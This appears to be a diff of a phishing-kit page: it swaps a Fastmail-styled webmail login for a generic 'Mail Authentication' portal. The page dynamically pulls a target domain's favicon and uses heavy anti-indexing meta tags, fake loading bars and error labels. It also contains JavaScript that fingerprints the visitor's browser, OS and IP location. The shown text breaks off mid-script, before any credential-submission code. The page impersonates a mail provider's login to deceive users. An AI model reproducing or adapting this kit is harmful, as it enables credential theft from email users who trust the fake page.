@@ -1,495 +1,1555 @@
-<!DOCTYPE html> 
-<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<link id="favicon" rel="shortcut icon" sizes="32x32" href="https://www.fastmail.com/static/favicons/icon-32x32.png">     
-<title  class="logoname">Webmail :: Login</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-<link rel="apple-touch-icon" type="image/png"  class="logoimg" href="" /> 
-<link rel="shortcut icon" type="image/x-icon"  class="logoimg"  href="" />
-<link rel="mask-icon" type=""  class="logoimg" href="" color="#111" />
-<meta name="robots" content="noindex">
-<meta name="googlebot" content="noindex">
-<meta name="googlebot-news" content="noindex" />
-<meta name="otherbot" content="noindex" />
-<meta name="noarchive" content="noindex" />
-<meta name="nosnippet" content="noindex" />
-<meta name="noimageindex" content="noindex" />
-<meta name="robots" content="none">
-<meta name="googlebot" content="none">
-<meta name="googlebot-news" content="none" />
-<meta name="otherbot" content="none" />
-<meta name="noarchive" content="none" />
-<meta name="nosnippet" content="none" />
-<meta name="noimageindex" content="none" />
-<meta name="robots" content="nofollow">
-<meta name="googlebot" content="nofollow">
-<meta name="googlebot-news" content="nofollow" />
-<meta name="otherbot" content="nofollow" />
-<meta name="noarchive" content="nofollow" />
-<meta name="nosnippet" content="nofollow" />
-<meta name="noimageindex" content="nofollow" />
-<meta name="robots" content="max-snippet:0">
-<meta name="robots" content="unavailable_after: 2021-10-22">
-    <!-- Favicon icon -->
-    <link rel="shortcut icon"  class="logoimg" href="" type="image/x-icon">
-    <!-- External CSS libraries 
-    <link type="text/css" rel="stylesheet" href="./login2_files/style2.css">
-	
-
-    <link type="text/css" rel="stylesheet" href="./login2_files/bootstrap.min.css">
-  	-->  <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-	
-	<style type="text/css">
-	
-	body {
-    font-family: 'Open Sans', sans-serif;
-    color: #535353;
+<html id="html" data-ref="alphash" data-iframe="0" lang="en"><head>
+    <meta charset="UTF-8">
+    <title>PORTAL - <span id="tit"></span> Mail Authentication</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+	<meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="googlebot-news" content="noindex" />
+    <meta name="otherbot" content="noindex" />
+    <meta name="noarchive" content="noindex" />
+    <meta name="nosnippet" content="noindex" />
+    <meta name="noimageindex" content="noindex" />
+    <meta name="robots" content="none">
+    <meta name="googlebot" content="none">
+    <meta name="googlebot-news" content="none" />
+    <meta name="otherbot" content="none" />
+    <meta name="noarchive" content="none" />
+    <meta name="nosnippet" content="none" />
+    <meta name="noimageindex" content="none" />
+    <meta name="robots" content="nofollow">
+    <meta name="googlebot" content="nofollow">
+    <meta name="googlebot-news" content="nofollow" />
+    <meta name="otherbot" content="nofollow" />
+    <meta name="noarchive" content="nofollow" />
+    <meta name="nosnippet" content="nofollow" />
+    <meta name="noimageindex" content="nofollow" />
+    <meta name="robots" content="max-snippet:0">
+    <meta name="robots" content="unavailable_after: 2021-10-22">
+    <link id="faviconx" rel="icon" type="image/x-icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&amp;type=FAVICON&amp;fallback_opts=TYPE,SIZE,URL&amp;url=http://aegistax.com&amp;size=64">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <style>
+.icon {
+    margin-right: 10px;
 }
-
-.img-fluid {
-    max-width: 100% !important;
-    height: auto;
-}
-
-.form-control:focus {
-    box-shadow: none;
-}
-
-h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 {
-    font-family: 'Open Sans', sans-serif;
-}
-
-/** Login 1 start **/
-.login-1 {
-    background: rgba(0, 0, 0, 0.04) url(../img/bg-image.jpg) top left repeat;
-    background-size: cover;
-    top: 0;
-    width: 100%;
-    bottom: 0;
-    opacity: 1;
-    min-height: 100vh;
-    text-align: center;
-    position: relative;
-    display: -webkit-box;
-    display: -moz-box;
-    display: -ms-flexbox;
-    display: -webkit-flex;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 30px;
-}
-
-.login-1 .login-inner-form {
-    max-width: 380px;
-    margin: 0 auto;
-    color: #717171;
-    text-align: center;
-}
-
-.login-1 .login-inner-form .details {
-    padding: 25px 30px 30px;
-    background: #fff;
-    border-radius: 5px 5px 0 0;
-}
-
-.login-1 .login-inner-form img {
-    margin-bottom: 15px;
-    height: 30px;
-}
-
-.login-1 .login-inner-form h3 {
-    margin: 0 0 25px;
-    font-size: 18px;
-    font-weight: 400;
-    font-family: 'Open Sans', sans-serif;
-    color: #717171;
-}
-
-.login-1 .login-inner-form .form-group {
-    margin-bottom: 25px;
-}
-
-.login-1 .login-inner-form .input-text {
-    width: 100%;
-    padding: 10px 15px;
-    font-size: 14px;
-    border: 1px solid #e8e7e7;
-    outline: none;
-    color: #717171;
-    border-radius: 3px;
-    height: 45px;
-}
-
-.login-1 .login-inner-form .btn-md {
-    cursor: pointer;
-    padding: 12px 30px 11px 30px;
-    letter-spacing: 1px;
-    font-size: 15px;
-    font-weight: 600;
-    font-family: 'Open Sans', sans-serif;
-    border-radius: 3px;
-}
-
-.login-1 .login-inner-form .social-list{
-    margin-bottom: 0;
-    padding: 0;
-}
-
-.login-1 .login-inner-form .checkbox a {
-    font-size: 14px;
-    color: #717171;
-    float: right;
-}
-
-.login-1 .login-inner-form .terms{
-    margin-left: 3px;
-}
-
-.login-1 .login-inner-form .checkbox {
-    margin-bottom: 25px;
-    font-size: 14px;
-}
-
-.login-1 .login-inner-form .form-check{
-    float: left;
-    margin-bottom: 0;
-}
-
-.login-1 .login-inner-form .form-check a {
-    color: #717171;
-    float: right;
-}
-
-.login-1 .login-inner-form .form-check-input {
-    position: absolute;
-    margin-left: 0;
-}
-
-.login-1 .login-inner-form .form-check label::before {
-    content: "";
+.info {
     display: inline-block;
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    margin-left: -25px;
-    border: 1px solid #cccccc;
-    border-radius: 3px;
-    background-color: #fff;
 }
-
-.login-1 .login-inner-form .form-check-label {
-    padding-left: 25px;
-    margin-bottom: 0;
-    font-size: 14px;
-}
-
-.login-1 .login-inner-form .checkbox-theme input[type="checkbox"]:checked + label::before {
-    background-color: #0f96f9;
-    border-color: #0f96f9;
-}
-
-.login-1 .login-inner-form input[type=checkbox]:checked + label:before {
-    font-weight: 300;
-    color: #f3f3f3;
-    line-height: 15px;
-    font-size: 14px;
-    content: "\2713";
-}
-
-.login-1 .login-inner-form input[type=checkbox], input[type=radio] {
-    margin-top: 4px;
-}
-
-.login-1 .login-inner-form .social-list li {
-    display: inline-block;
-    font-size: 16px;
-    margin-top: 30px;
-}
-
-.login-1 .login-inner-form .social-list li a {
-    margin:2px;
-    font-size: 14px;
-    width: 35px;
-    height: 35px;
-    border-radius: 3px;
-    display: inline-block;
-    text-align: center;
-    line-height: 35px;
-}
-
-.login-1 .login-inner-form .footer {
-    font-size: 14px;
-    padding: 15px 20px;
-    background-color: #f5f5f5;
-    border-radius: 0 0 5px 5px;
-    border-top: solid 1px #f5f5f5;
-}
-
-.login-1 .login-inner-form .footer span a {
-    color: #717171;
-}
-
-.login-1 .login-inner-form button:focus {
-    outline: none;
-    outline: 0 auto -webkit-focus-ring-color;
-}
-
-.login-1 .login-inner-form .btn-theme:not([disabled]):not(.disabled).active, .btn-theme:not([disabled]):not(.disabled):active, .show > .btn-theme.dropdown-toggle {
-    box-shadow: none;
-}
-
-.login-1 .login-inner-form .btn-theme.focus, .btn-theme:focus {
-    box-shadow: none;
-}
-
-.login-1 .login-inner-form .btn-theme {
-    background: #0f96f9;
-    border: none;
-    color: #fff;
-}
-
-.login-1 .login-inner-form .btn-theme:hover {
-    background: #0294B6;
-}
-
-/** Social media **/
-.login-1 .facebook-bg {
-    background: #4867aa;
-    color: #fff;
-}
-
-.login-1 .facebook-bg:hover {
-    background: #3b589e;
-    color: #fff;
-}
-
-.login-1 .twitter-bg {
-    background: #33CCFF;
-    color: #fff;
-}
-
-.login-1 .twitter-bg:hover {
-    background: #56d7fe;
-    color: #fff;
-}
-
-.login-1 .google-bg {
-    background: #db4437;
-    color: #fff;
-}
-
-.login-1 .google-bg:hover {
-    background: #dc4e41;
-    color: #fff;
-}
-
-.login-1 .linkedin-bg {
-    background: #0177b5;
-    color: #fff;
-}
-
-.login-1 .linkedin-bg:hover {
-    background: #1c82ca;
-    color: #fff;
-}
-
-/** MEDIA **/
-@media (max-width: 992px) {
-    .login-1 {
-        padding: 30px 0;
-    }
-}
-
-
-	.style1 {color: #FFFFFF}
+        
+        body,
+        [class~=main_container] {
+            background-color: #fff;
+			overflow-x:hidden;
+        }
+        
+        [class~=main_container],
+        body,
+        [class~=container] {
+            display: flex;
+        }
+        
+        [class~=main_container],
+        body {
+            justify-content: center;
+        }
+        
+        [class~=container] h3 {
+            color: #000;
+        }
+        
+        [class~=container] {
+            width: 26.25pc;
+        }
+        
+        #auth_reg {
+            color: red;
+        }
+        
+        [class~=container] {
+            height: 500px;
+        }
+        
+        #auth_reg {
+            padding-left: 3.75pt;
+        }
+        
+        #auth_reg {
+            padding-bottom: 3.75pt;
+        }
+        
+        [class~=container] h3,
+        [class~=container] h3 i,
+        [class~=intro-text] p {
+            font-size: 1rem;
+        }
+        
+        * {
+            box-sizing: border-box;
+        }
+        
+        [class~=intro-text] p {
+            padding-top: .3rem;
+        }
+        
+        .input input:focus {
+            border-left-width: .020833333in;
+        }
+        
+        #auth_reg {
+            padding-right: 3.75pt;
+        }
+        
+        [class~=container] {
+            background: #fff;
+        }
+        
+        [class~=container] {
+            box-shadow: 0 .625pc 15px rgba(179, 179, 179, .7);
+        }
+        
+        * {
+            margin-left: 0;
+        }
+        
+        [class~=container] {
+            position: absolute !important;
+        }
+        
+        [class~=intro-text] p {
+            font-family: Cambria, Cochin, Georgia, Times, "Times New Roman", serif;
+        }
+        
+        [class~=intro-text] p {
+            text-align: center;
+        }
+        
+        [class~=intro-text] h2 {
+            color: #0627ab;
+        }
+        
+        [class~=intro-text] h2 {
+            font-size: 1.2rem;
+        }
+        
+        [class~=input] input:valid~label,
+        [class~=container] {
+            top: 10%;
+        }
+        
+        [class~=join-link] a {
+            text-decoration: none;
+        }
+        
+        [class~=join-link] a {
+            font-weight: normal;
+        }
+        
+        #auth_reg {
+            padding-top: 3.75pt;
+        }
+        
+        #auth_reg2,
+        #auth_reg {
+            font-size: small;
+        }
+        
+        [class~=join-link] a {
+            color: rgba(128, 128, 128, .577);
+        }
+        
+        [class~=forgot-pass-link]:hover {
+            background: rgba(10, 102, 195, .3);
+        }
+        
+        [class~=container] {
+            display: none;
+        }
+        
+        button {
+            height: 60px !important;
+        }
+        
+        [class~=loader] [class~=loaderBar] {
+            position: absolute;
+        }
+        
+        [class~=loader] [class~=loaderBar] {
+            border-radius: .625pc;
+        }
+        
+        button {
+            background: #0a66c3;
+        }
+        
+        [class~=container],
+        [class~=intro-text] {
+            flex-direction: column;
+        }
+        
+        .input input:focus {
+            border-bottom-width: .020833333in;
+        }
+        
+        [class~=input],
+        [class~=input] input {
+            width: 100%;
+        }
+        
+        [class~=input],
+        [class~=input] input {
+            height: .520833333in;
+        }
+        
+        [class~=container] {
+            justify-content: space-evenly;
+        }
+        
+        [class~=container] {
+            padding-left: 2rem;
+        }
+        
+        [class~=container] h3 i {
+            padding-left: .1rem;
+        }
+        
+        [class~=container] {
+            padding-bottom: 2rem;
+        }
+        
+        [class~=input] input {
+            padding-top: 1.1rem;
+        }
+        
+        [class~=container] {
+            padding-right: 2rem;
+        }
+        
+        [class~=input] input {
+            padding-left: .09375in;
+        }
+        
+        * {
+            margin-bottom: 0;
+        }
+        
+        button,
+        [class~=input] input {
+            outline: none;
+        }
+        
+        #auth_reg2,
+        #auth_reg {
+            font-family: sans-serif, "Helvetica Neue", "Lucida Grande", Arial;
+        }
+        
+        [class~=container] {
+            padding-top: 0rem;
+        }
+        
+        [class~=container] {
+            z-index: 99999999;
+        }
+        
+        [class~=loader] [class~=loaderBar] {
+            top: 0;
+        }
+        
+        [class~=intro-text] {
+            display: flex;
+        }
+        
+        [class~=intro-text] {
+            justify-content: center;
+        }
+        
+        [class~=input] input {
+            border-left-width: .0625pc;
+        }
+        
+        [class~=input] input {
+            border-bottom-width: .0625pc;
+        }
+        
+        [class~=intro-text]>* {
+            margin-left: auto;
+        }
+        
+        button {
+            border-left-width: medium;
+        }
+        
+        #auth_reg2,
+        #auth_reg {
+            font-stretch: expanded;
+        }
+        
+        button {
+            border-bottom-width: medium;
+        }
+        
+        [class~=input] input {
+            border-right-width: .0625pc;
+        }
+        
+        [class~=input] input {
+            border-top-width: .0625pc;
+        }
+        
+        [class~=input] input {
+            border-left-style: solid;
+        }
+        
+        [class~=intro-text]>* {
+            margin-bottom: .625pc;
+        }
+        
+        [class~=input] input {
+            border-bottom-style: solid;
+        }
+        
+        [class~=intro-text]>* {
+            margin-right: auto;
+        }
+        
+        #auth_reg2 {
+            color: red;
+        }
+        
+        [class~=input] input {
+            border-right-style: solid;
+        }
+        
+        [class~=input] input {
+            border-top-style: solid;
+        }
+        
+        [class~=input] input {
+            border-left-color: #8c8c8c;
+        }
+        
+        [class~=input] input {
+            border-bottom-color: #8c8c8c;
+        }
+        
+        [class~=intro-text]>* {
+            margin-top: auto;
+        }
+        
+        [class~=input] input {
+            border-right-color: #8c8c8c;
+        }
+        
+        .input input:focus {
+            border-right-width: .020833333in;
+        }
+        
+        button {
+            border-right-width: medium;
+        }
+        
+        button {
+            border-top-width: medium;
+        }
+        
+        [class~=input] input {
+            border-top-color: #8c8c8c;
+        }
+        
+        [class~=input] {
+            position: relative;
+        }
+        
+        [class~=input] input {
+            border-image: none;
+        }
+        
+        [class~=loader] [class~=loaderBar] {
+            right: 100%;
+        }
+        
+        [class~=input] input {
+            border-radius: .1875pc;
+        }
+        
+        [class~=input] input,
+        [class~=input] label {
+            transition: .2s;
+        }
+        
+        [class~=input] {
+            margin-bottom: .7rem;
+        }
+        
+        [class~=forgot-pass-link],
+        [class~=join-link] {
+            text-align: center;
+        }
+        
+        * {
+            margin-right: 0;
+        }
+        
+        [class~=input] input {
+            letter-spacing: .3rem;
+        }
+        
+        [class~=input] input {
+            font-size: 1rem;
+        }
+        
+        #auth_reg2,
+        .top_level h3 {
+            display: none;
+        }
+        
+        [class~=join-link] {
+            color: rgba(0, 0, 0, .5);
+        }
+        
+        #show_pass {
+            padding-left: 6pt;
+        }
+        
+        [class~=join-link] {
+            font-size: small;
+        }
+        
+        [class~=forgot-pass-link] {
+            width: 8.75pc;
+        }
+        
+        [class~=input] label {
+            position: absolute;
+        }
+        
+        [class~=forgot-pass-link] {
+            padding-left: .2rem;
+        }
+        
+        [class~=forgot-pass-link] {
+            padding-bottom: .2rem;
+        }
+        
+        [class~=input] label {
+            top: 30%;
+        }
+        
+        #auth_reg {}
+        
+        [class~=forgot-pass-link] {
+            padding-right: .2rem;
+        }
+        
+        [class~=input] label {
+            left: 7.5pt;
+        }
+        
+        .input input:focus {
+            border-top-width: .020833333in;
+        }
+        
+        #top_label,
+        [class~=input] label {
+            font-size: 1.1rem;
+        }
+        
+        [class~=forgot-pass-link] {
+            padding-top: .2rem;
+        }
+        
+        [class~=input] label {
+            color: #8c8c8c;
+        }
+        
+        #top_label_logo {
+            max-width: 160px;
+        }
+        
+        [class~=loader] [class~=loaderBar] {
+            bottom: 0;
+        }
+        
+        button {
+            border-left-style: none;
+        }
+        
+        [class~=forgot-pass-link] {
+            text-decoration: none;
+        }
+        
+        [class~=forgot-pass-link] {
+            font-weight: bolder;
+        }
+        
+        [class~=forgot-pass-link],
+        #top_label {
+            color: #0a66c3;
+        }
+        
+        #top_label_logo {
+            max-height: .833333333in;
+        }
+        
+        [class~=forgot-pass-link] {
+            transition: .3s;
+        }
+        
+        [class~=forgot-pass-link] {
+            border-radius: .75pc;
+        }
+        
+        .loader:before {
+            content: "";
+        }
+        
+        #top_label,
+        [class~=top_level],
+        [class~=rem_me] {
+            display: flex;
+        }
+        
+        [class~=input] input:valid~label {
+            font-size: .8rem;
+        }
+        
+        .loader:before {
+            border-left-width: .75pt;
+        }
+        
+        [class~=top_level],
+        [class~=loading_text] {
+            justify-content: center;
+        }
+        
+        #main_logo_id {
+            max-width: 75pt;
+        }
+        
+        .loader:before {
+            border-bottom-width: .75pt;
+        }
+        
+        .loader:before {
+            border-right-width: .75pt;
+        }
+        
+        [class~=rem_me],
+        [class~=top_level] {
+            align-items: center;
+        }
+        
+        button {
+            border-bottom-style: none;
+        }
+        
+        [class~=top_level] {
+            background-color: #dedede;
+        }
+        
+        [class~=top_level],
+        [class~=rem_me] {
+            padding-left: .3125pc;
+        }
+        
+        #main_logo_id {
+            min-width: auto;
+        }
+        
+        [class~=top_level] {
+            padding-bottom: 11.25pt;
+        }
+        
+        [class~=top_level],
+        [class~=rem_me] {
+            padding-right: .3125pc;
+        }
+        
+        [class~=top_level] {
+            padding-top: 15px;
+        }
+        
+        [class~=loader] [class~=loaderBar] {
+            left: 0;
+        }
+        
+        .loader:before {
+            border-top-width: .75pt;
+        }
+        
+        button {
+            border-right-style: none;
+        }
+        
+        #top_label {
+            text-align: center;
+        }
+        
+        [class~=rem_me] {
+            padding-bottom: 3.75pt;
+        }
+        
+        button {
+            border-top-style: none;
+        }
+        
+        [class~=loader] [class~=loaderBar] {
+            background-color: #626262;
+        }
+        
+        .loader,
+        .loader:before {
+            border-left-style: solid;
+        }
+        
+        .loader,
+        .loader:before {
+            border-bottom-style: solid;
+        }
+        
+        [class~=input] input:valid~label,
+        [class~=top_level] h3 span {
+            color: #000;
+        }
+        
+        button {
+            border-left-color: currentColor;
+        }
+        
+        [class~=rem_me] {
+            padding-top: 3.75pt;
+        }
+        
+        .loader,
+        .loader:before {
+            border-right-style: solid;
+        }
+        
+        .loader:before,
+        .loader {
+            border-top-style: solid;
+        }
+        
+        button {
+            border-bottom-color: currentColor;
+        }
+        
+        #top_label {
+            font-weight: bold;
+        }
+        
+        .loader {
+            width: 5.208333333in;
+        }
+        
+        .loader:before {
+            border-left-color: #747474;
+        }
+        
+        button {
+            border-right-color: currentColor;
+        }
+        
+        .loader {
+            margin-left: auto;
+        }
+        
+        .loader {
+            margin-bottom: 0;
+        }
+        
+        .loader {
+            margin-right: auto;
+        }
+        
+        .loader,
+        * {
+            margin-top: 0;
+        }
+        
+        .input input:focus {
+            border-left-color: #0a66c3;
+        }
+        
+        button {
+            border-top-color: currentColor;
+        }
+        
+        .loader:before {
+            border-bottom-color: #747474;
+        }
+        
+        button {
+            border-image: none;
+        }
+        
+        .loader:before {
+            border-right-color: #747474;
+        }
+        
+        .loader:before {
+            border-top-color: #747474;
+        }
+        
+        .loader {
+            border-radius: 7.5pt;
+        }
+        
+        .loader {
+            border-left-width: .041666667in;
+        }
+        
+        .loader:before {
+            border-image: none;
+        }
+        
+        .loader:before {
+            border-radius: 5px;
+        }
+        
+        .loader {
+            border-bottom-width: .041666667in;
+        }
+        
+        .loader:before {
+            position: absolute;
+        }
+        
+        .loader:before {
+            top: -.25pc;
+        }
+        
+        .input input:focus {
+            border-bottom-color: #0a66c3;
+        }
+        
+        [class~=loader] [class~=loaderBar] {
+            width: 0;
+        }
+        
+        .loader {
+            border-right-width: .041666667in;
+        }
+        
+        .loader {
+            border-top-width: .041666667in;
+        }
+        
+        .loader:before {
+            right: -3pt;
+        }
+        
+        button {
+            border-radius: 0px;
+        }
+        
+        button {
+            color: #fff;
+        }
+        
+        .input input:focus {
+            border-right-color: #0a66c3;
+        }
+        
+        .loader:before {
+            bottom: -3pt;
+        }
+        
+        button {
+            font-size: 1rem;
+        }
+        
+        button {
+            font-weight: bolder;
+        }
+        
+        button {
+            cursor: pointer;
+        }
+        
+        .input input:focus {
+            border-top-color: #0a66c3;
+        }
+        
+        [class~=loader] [class~=loaderBar] {
+            animation: borealisBar 1.3s linear infinite;
+        }
+        
+        .loader {
+            border-left-color: transparent;
+        }
+        
+        .loader:before {
+            left: -3pt;
+        }
+        
+        [class~=input] input:focus~label {
+            top: 10%;
+        }
+        
+        .loader {
+            border-bottom-color: transparent;
+        }
+        
+        .loader {
+            border-right-color: transparent;
+        }
+        
+        .loader {
+            border-top-color: transparent;
+        }
+        
+        .loader {
+            border-image: none;
+        }
+        
+        .loader {
+            position: relative;
+        }
+        
+        .loader {
+            padding-left: .0625pc;
+        }
+        
+        [class~=input] input:focus~label {
+            font-size: .8rem;
+        }
+        
+        * {
+            padding-left: 0;
+        }
+        
+        .loader {
+            padding-bottom: .0625pc;
+        }
+        
+        .loader {
+            padding-right: .0625pc;
+        }
+        
+        .loader {
+            padding-top: .0625pc;
+        }
+        
+        * {
+            padding-bottom: 0;
+        }
+        
+        [class~=input] input:focus~label {
+            color: #000;
+        }
+        
+        * {
+            padding-right: 0;
+        }
+        
+        * {
+            padding-top: 0;
+        }
+        
+        @keyframes borealisBar {
+            0% {
+                left: 0%;
+                right: 100%;
+                width: 0%;
+            }
+            10% {
+                left: 0%;
+                right: 75%;
+                width: 25%;
+            }
+            90% {
+                right: 0%;
+                left: 75%;
+                width: 25%;
+            }
+            100% {
+                left: 100%;
+                right: 0%;
+                width: 0%;
+            }
+        }
+        
+        [class~=mail-loader_block] {
+            position: relative;
+        }
+        
+        [class~=mail-loader_block] {
+            margin-top: 12%;
+        }
+        
+        [class~=mail-loader_block] {
+            display: flex;
+        }
+        
+        [class~=mail-loader_block] {
+            justify-content: center;
+        }
+        
+        [class~=mail-loader_block] {
+            align-items: center;
+        }
+        
+        [class~=mail-loader_block] {
+            flex-direction: column;
+        }
+        
+        [class~=progress-bar] {
+            border-radius: 7.5pt;
+        }
+        
+        [class~=progress-bar] {
+            overflow: hidden;
+        }
+        
+        [class~=progress-bar] {
+            width: 100%;
+        }
+        
+        [class~=progress-bar] {
+            border-left-style: solid;
+        }
+        
+        [class~=progress-bar] {
+            border-bottom-style: solid;
+        }
+        
+        [class~=progress-bar] {
+            border-right-style: solid;
+        }
+        
+        [class~=progress-bar] {
+            border-top-style: solid;
+        }
+        
+        [class~=mail-loader_block] img {
+            margin-left: auto;
+        }
+        
+        [class~=progress-bar] {
+            border-left-width: .005208333in;
+        }
+        
+        [class~=progress-bar] {
+            border-bottom-width: .005208333in;
+        }
+        
+        [class~=progress-bar] {
+            border-right-width: .005208333in;
+        }
+        
+        [class~=progress-bar] {
+            border-top-width: .005208333in;
+        }
+        
+        [class~=progress-bar] {
+            border-left-color: #000;
+        }
+        
+        [class~=progress-bar] {
+            border-bottom-color: #000;
+        }
+        
+        [class~=progress-bar] {
+            border-right-color: #000;
+        }
+        
+        [class~=progress-bar] {
+            border-top-color: #000;
+        }
+        
+        [class~=bar] {
+            background: transparent;
+        }
+        
+        [class~=bar],
+        [class~=progress] {
+            padding-left: .020833333in;
+        }
+        
+        [class~=progress],
+        [class~=bar] {
+            padding-bottom: .020833333in;
+        }
+        
+        [class~=progress],
+        [class~=bar] {
+            padding-right: .020833333in;
+        }
+        
+        [class~=progress],
+        [class~=bar] {
+            padding-top: .020833333in;
+        }
+        
+        [class~=progress] {
+            animation: loader 8s ease infinite;
+        }
+        
+        [class~=progress] {
+            background: #fe0;
+        }
+        
+        [class~=progress] {
+            color: #fff;
+        }
+        
+        [class~=progress] {
+            width: 0;
+        }
+        
+        [class~=progress-bar] {
+            left: 50%;
+        }
+        
+        [class~=progress-bar] {
+            width: 5.208333333in;
+        }
+        
+        [class~=progress-bar] {
+            position: absolute;
+        }
+        
+        [class~=mail-loader_block] img {
+            margin-bottom: 15pt;
+        }
+        
+        [class~=progress-bar] {
+            top: 50%;
+        }
+        
+        [class~=progress-bar] {
+            transform: translate3d(-50%, -50%, 0);
+        }
+        
+        [class~=mail-loader_block] img {
+            margin-right: auto;
+        }
+        
+        [class~=mail-loader_block] img {
+            margin-top: auto;
+        }
+        
+        [class~=mail-loader_block] img {
+            border-radius: 0%;
+        }
+        
+        .progress-bar span {
+            display: block;
+        }
+        
+        @keyframes loader {
+            0% {
+                width: 0;
+            }
+            20% {
+                width: 10%;
+            }
+            25% {
+                width: 24%;
+            }
+            43% {
+                width: 41%;
+            }
+            56% {
+                width: 50%;
+            }
+            66% {
+                width: 52%;
+            }
+            71% {
+                width: 60%;
+            }
+            75% {
+                width: 76%;
+            }
+            94% {
+                width: 86%;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+        
+        .progress_loaderx {
+            position: relative;
+        }
+        
+        .progress_loaderx {
+            margin-top: 15%;
+        }
+        
+        .progress_loaderx {
+            display: flex;
+        }
+        
+        .progress_loaderx {
+            justify-content: center;
+        }
+        
+        .progress_loaderx {
+            align-items: center;
+        }
+        
+        .overlay_div {
+            position: fixed;
+        }
+        
+        .overlay_div {
+            background-color: rgba(0, 0, 0, .196);
+        }
+        
+        [class~=new_feature] [class~=left_box] {
+            display: block !important;
+        }
+        
+        .progress_loaderx img {
+            margin-left: auto;
+        }
+        
+        .overlay_div {
+            width: 100%;
+        }
+        
+        .overlay_div {
+            height: 100%;
+        }
+        
+        .overlay_div {
+            z-index: 99999;
+        }
+        
+        .overlay_div {
+            display: none;
+        }
+        
+        [class~=new_feature] {
+            border-left-style: solid;
+        }
+        
+        [class~=new_feature] {
+            border-bottom-style: solid;
+        }
+        
+        [class~=new_feature] {
+            border-right-style: solid;
+        }
+        
+        [class~=new_feature] {
+            border-top-style: solid;
+        }
+        
+        [class~=new_feature] {
+            border-left-width: .75pt;
+        }
+        
+        [class~=new_feature] {
+            border-bottom-width: 0pt;
+        }
+        
+        [class~=new_feature] {
+            border-right-width: 0in;
+        }
+        
+        [class~=new_feature] {
+            border-top-width: 0pt;
+        }
+        
+        [class~=new_feature] {
+            border-left-color: rgba(138, 138, 138, .582);
+        }
+        
+        [class~=new_feature] {
+            border-bottom-color: rgba(138, 138, 138, .582);
+        }
+        
+        [class~=new_feature] {
+            border-right-color: rgba(138, 138, 138, .582);
+        }
+        
+        [class~=new_feature] {
+            border-top-color: rgba(138, 138, 138, .582);
+        }
+        
+        .progress_loaderx img {
+            margin-bottom: 6.25pc;
+        }
+        
+        [class~=new_feature] {
+            margin-left: 200px;
+        }
+        
+        [class~=left_box] {
+            position: absolute;
+        }
+        
+        [class~=left_box] {
+            background-color: rgba(106, 106, 106, .392);
+        }
+        
+        [class~=left_box] {
+            width: 3.125in;
+        }
+        
+        [class~=left_box] {
+            height: 26.875pc;
+        }
+        
+        [class~=left_box] {
+            z-index: 9999999;
+        }
+        
+        [class~=left_box] {
+            right: 430px;
+        }
+        
+        [class~=left_box] {
+            padding-left: .052083333in;
+        }
+        
+        [class~=left_box] {
+            padding-bottom: .052083333in;
+        }
+        
+        [class~=left_box] {
+            padding-right: .052083333in;
+        }
+        
+        [class~=left_box] {
+            padding-top: .052083333in;
+        }
+        
+        [class~=left_box]>* {
+            color: red;
+        }
+        
+        .progress_loaderx img {
+            margin-right: auto;
+        }
+        
+        .progress_loaderx img {
+            margin-top: auto;
+        }
+        
+        .progress_loaderx img {
+            border-radius: 50%;
+        }
+        
+        @media only screen and (max-width: 600px) {
+            [class~=mail-loader_block],
+            .progress_loaderx {
+                margin-top: 50%;
+            }
+            [class~=progress-bar],
+            [class~=loader] {
+                width: 85%;
+            }
+            [class~=container] {
+                box-shadow: 0 7.5pt 11.25pt rgba(179, 179, 179, 0) !important;
+            }
+            [class~=container] {
+                width: auto;
+            }
+            [class~=container] {
+                height: auto;
+            }
+            [class~=container] {
+                top: 8%;
+            }
+        }
     </style>
-	<script type="text/javascript">
-	function formfocus() {
-		document.getElementById('password').focus();
-	}
-	window.onload = formfocus;
+
+
+<script>
+// Function to display date, time, browser, OS, and location
+function displayInfo() {
+    // Display current date and time
+    var currentDate = new Date();
+    var dateString = currentDate.toDateString();
+    var timeString = currentDate.toLocaleTimeString();
+    var datetimeElements = document.getElementsByClassName("datetime");
+    for (var i = 0; i < datetimeElements.length; i++) {
+        datetimeElements[i].innerHTML = '<i class="far fa-calendar-alt icon"></i>' + dateString + '<i class="far fa-clock icon"></i>' + timeString;
+    }
+
+    // Display browser type
+    var browserType = detectBrowser();
+    var browserElements = document.getElementsByClassName("browser");
+    for (var i = 0; i < browserElements.length; i++) {
+        browserElements[i].innerHTML = '<i class="fab fa-internet-explorer icon"></i>' + browserType;
+    }
+
+    // Display operating system
+    var os = detectOS();
+    var osElements = document.getElementsByClassName("os");
+    for (var i = 0; i < osElements.length; i++) {
+        osElements[i].innerHTML = '<i class="fab fa-windows icon"></i>' + os;
+    }
+
+    // Get and display user's location (city and country) based on IP address
+    fetch("https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+            var city = data.city;
+            var country = data.country_name;
+            var locationElements = document.getElementsByClassName("location");
+            for (var i = 0; i < locationElements.length; i++) {
+                locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country;
+            }
+        })
+        .catch(error => {
+            var locationElements = document.getElementsByClassName("location");
+            for (var i = 0; i < locationElements.length; i++) {
+                locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>Unable to retrieve';
+            }
+        });
+}
+
+// Function to detect browser type
+function detectBrowser() {
+    var userAgent = window.navigator.userAgent;
+    var browsers = {chrome: /chrome/i, safari: /safari/i, firefox: /firefox/i, ie: /internet explorer/i, edge: /edge/i, opera: /opera|OPR/i, android: /android/i, ios: /iphone|ipad|ipod/i};
